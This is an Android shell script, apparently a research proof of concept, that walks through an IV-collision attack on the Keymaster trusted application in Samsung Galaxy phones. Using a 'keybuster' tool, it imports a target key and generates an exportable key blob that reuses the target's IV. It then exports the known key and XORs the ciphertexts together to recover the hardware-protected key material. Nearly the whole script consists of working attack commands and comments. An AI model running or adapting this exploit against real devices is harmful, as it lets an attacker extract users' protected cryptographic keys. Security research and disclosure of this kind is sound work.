#!/bin/sh

set -e
cd /data/local/tmp
chmod +x ./keybuster

echo "\
We show an attack on the Keymaster TA in Samsung Galaxy devices: we will force a collision \
in both the encryption key and the IV that are used to
encrypt two key blobs - blob_a (unknown target key) and blob_b (known key) - \
then xor the encrypted data of blob_a with
the encrypted data of blob_b and with the known plaintext of blob_b to recover the plaintext of blob_a."

echo "\nIn reality blob_a is unknown. For the purposes of the PoC, \
we use a known key for blob_a and show that we can fully recover it from the xor of its
encrypted key material with the encrypted key material of blob_b (that collides with it) \
and the known key material of blob_b.
Other ways to verify the correctness of the recovered key include performing a cryptographic operation (e.g. sign/decrypt)
with blob_a and with the recovered key and verifying that the outputs are equal."

echo "\nIn this demo, we import aes_256_key.bin (a random 32 byte key) as blob_a,
then generate an exportable AES-256 key blob as blob_b with colliding encryption key and IV and
recover the key material of blob_a.\n"

echo -n "creating a random AES-256 key from /dev/urandom to aes_256_key.bin (for blob_a)..."
dd if=/dev/urandom of=aes_256_key.bin bs=32 count=1 &> /dev/null
echo "done"

echo "original aes_256_key.bin: "
xxd aes_256_key.bin

echo "Attack log: $(realpath attack.log)"

sep=$(printf "%100s")

echo -e ${sep// /-}

# 1. Generate the target ekey blob (that we wish to recover).
#
#    For the purposes of the PoC, we use a known key to show that the attack fully recovers it.
#    In reality, the key material for blob_a can be unknown.
#
#
#   We can generate an ekey blob with a known key blob using one of the following options:
#
#       a. generateKey command for a symmetric key (e.g. AES/DES) with KM_TAG_EXPORTABLE
#       b. importKey command for any key (AES/DES/RSA/EC/HMAC)
#
#   The tool (keybuster) parses the output ekey blob and creates 3 files:
#       1. The IV that was used to encrypt it (iv-blob_a.bin) taken from KM_TAG_EKEY_BLOB_IV
#       2. The encrypted serialized key material (encrypted-blob_a.bin) taken from ekey_blob->ekey
#       3. The ekey blob (blob_a.bin)
#

echo -n "1. Importing aes_256_key.bin to a v15 ekey blob (blob_a.bin)..."

./keybuster -c import -i id -d data -e blob_a.bin --key-size 256 --enc-ver 15 -p aes_256_key.bin 2&> attack.log

echo "done"

echo -e ${sep// /-}

# 2. Create an ekey blob with known key material that collides with the first blob, using one of the following options:
#
#     a. generateKey command for a symmetric key (e.g. AES/DES) with KM_TAG_EXPORTABLE
#     b. importKey command for any key (AES/DES/RSA/EC/HMAC)
#
#   The tool (keybuster) will pass the IV that we specify (iv-blob_a.bin) to the keymaster,
#   then create the output ekey blob (blob_b.bin) as well as the encrypted key material (encrypted-blob_b.bin).
#   Then, it will export the key material (to plain-blob_b.bin) - alternatively, we can import a known key.
#
#   To demonstrate that we can export raw key material (which is another design flaw),
#   we generate an exportable symmetric key and use the exportKey command to retrieve its key.
#
#   Overall:
#       - A new ekey blob (blob_b.bin) will be created using the same IV that the other blob used (blob_a)
#       - The new ekey blob has known key material (plain-blob_b.bin)

echo -n "2.1 Generating an exportable v15 key blob (blob_b) with the same IV, app id and app data \
that were used to create blob_a..."

./keybuster -c generate -i id -d data -e blob_b.bin --key-size 256 --enc-ver 15 --iv iv-blob_a.bin --exportable 2&>> attack.log

echo "done"

echo -n "2.2 Export the known key material of blob_b to plain-blob_b.bin using exportKey..."

./keybuster -c export -i id -d data -e blob_b.bin 2&>> attack.log

echo "done"

echo "Note: instead of generating an exportable key we could simply import a known key"

echo -e ${sep// /-}

# 3. Xor the known key, its ekey and the unknown ekey to fully recover the unknown key material.
#
#   The tool (keybuster) receives:
#   - the known key material (plain-blob_b.bin)
#   - the encrypted key material for the known blob (encrypted-blob_b.bin)
#   - the encrypted key material for the unknown blob (blob_b.bin)
#
#   It outputs the recovered key material for the unknown ekey (recovered-blob_a.bin)
#

echo -n "3. Xor the known key material of blob_b with the encrypted key material of blob_b and the encrypted key material of blob_a..."

./keybuster -c attack -p plain-blob_b.bin -e encrypted-blob_b.bin -s encrypted-blob_a.bin -o recovered-blob_a.bin 2&>> attack.log

echo "done"

echo "recovered plaintext for blob_a is $(realpath recovered-blob_a.bin): "
xxd recovered-blob_a.bin

echo -e ${sep// /-}

echo -n "comparing the recovered key against the key we imported for blob_a (aes_256_key.bin)..."
diff recovered-blob_a.bin aes_256_key.bin
echo "done"

echo "successully recovered key material!"
